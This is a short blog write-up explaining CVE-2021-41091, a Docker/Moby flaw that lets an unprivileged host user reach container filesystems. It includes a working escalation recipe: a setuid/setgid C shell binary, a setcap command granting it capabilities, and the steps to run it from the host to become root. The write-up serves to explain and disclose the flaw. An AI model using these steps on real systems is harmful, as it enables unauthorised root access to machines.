+++
title = "CVE-2021-41091"
date = "2023-05"
author = "Celeste"
authorTwitter = "" #do not include @
cover = ""
tags = ["CVE"]
keywords = ["", ""]
description = ""
showFullContent = false
readingTime = false
hideComments = false
color = "" #color from the theme settings
+++

### When docker containers aren't as contained as you would think. 

CVE-2021-41091 is a vulnerability in moby. Moby is an open source project created by docker to aid in software containerisation. To exploit this vulnerability on a linux machine you need root inside of a docker container and an unpriviliged user on the host. Containers effected by this CVE would be accessible to the user outside of the container, with whatever functionality and permissions we gave it as root within the container. 

First within the container as root need to create a simple program to set our uid and gid to 0 (root) and run /bin/bash to enter a shell. 
betroot.c
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
	setuid(0); 
	setgid(0);
	system("/bin/bash");
	return 0;
}
```

This can be compiles with 
`gcc beroot.c -o beroot`

The ability for a process to change uids and gids in execution is disabled by default for good reason. By default docker containers give root CAP_SETFCAP allowing them to use setcap to give a file arbitrary permissions. We can use this to enable the binary to set it's own uid and gid like so: 
```
setcap cap_setgid,cap_setuid+eip beroot
```

You can verify this with `getcap beroot` which should return:
```
beroot = cap_setgid,cap_setuid+eip
```

Now all you need to do is locate your docker container containing the malicous beroot binary you just made and run it from you user on the host. Find the docker contianer with `findmnt`.
When your run this binary as your user on the host `./beroot` still has permission to set it's own uid and gid because as far as your computer is concerned that was enabled by root. It will also execute /bin/bash from the actual root file system, because your user is outside of the container. You are now root on the host. 

Docker stores the filesystems within containers as subdirectories within the data directory (usually `/var/lib/docker`). The problem here is that in the vulnerable versions any user could generally access these subdirectories, meaining if you could get root within the container you could use it to escalate privileges outside of the container. This effected Moby  (Docker Engine) v20.10.3 < 20.10.9, this was tested on Ubuntu 20.04. 
